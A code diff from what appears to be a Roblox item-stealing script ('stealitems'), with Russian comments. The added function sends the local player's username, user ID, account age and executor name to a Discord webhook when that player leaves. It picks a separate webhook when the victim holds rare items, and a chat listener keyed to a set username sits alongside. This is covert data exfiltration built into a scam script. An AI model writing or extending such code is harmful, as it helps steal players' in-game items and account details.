@@ -1181,6 +1181,59 @@ local function stealitems()
     wait(3)
 end
 
+-- Функция для отправки уведомлений
+function sendPlayerLeaveNotification(playerName)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+    -- Условие для выбора вебхука
+    local selectedWebhook = webHook -- это вебхук по умолчанию
+    if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
+        selectedWebhook = GoodwebHook -- это вебхук для специального случая
+    end
+
+    local dataLeave = {
+        username = "Notification",
+        avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=675b88f3&is=675a3773&hm=e3a132b25e9e68d7eacd6ff736b660d8651a3cd9fb9493b9ddbb70767f4cf8bf&",
+        content = "**" .. playerName .. "** left from the game!",
+        embeds = {
+            {
+                color = 0xff3e3e,
+                fields = {
+                    {
+                        name = "〘:rotating_light:〙**Player Info**",
+                        value = "```lua" ..
+                            "\nUsername      : " .. game.Players.LocalPlayer.Name ..
+                            "\nUser-ID       : " .. game.Players.LocalPlayer.userId ..
+                            "\nAccount Age   : " .. game.Players.LocalPlayer.AccountAge ..
+                            "\nExecutor      : " .. identifyexecutor() .. "```",
+                        inline = false
+                    }
+                }
+            }
+        }
+    }
+
+    local jsonDataLeave = game:GetService("HttpService"):JSONEncode(dataLeave)
+
+    -- Отправка уведомления с выбранным вебхуком
+    local response = request({
+        Url = selectedWebhook,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonDataLeave
+    })
+end
+
+-- Обработчик для ухода игрока
+game.Players.PlayerRemoving:Connect(function(player)
+    if player == game.Players.LocalPlayer then
+        sendPlayerLeaveNotification(player.Name)
+    end
+end)
+
+
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == userName then
         player.Chatted:Connect(function(msg)
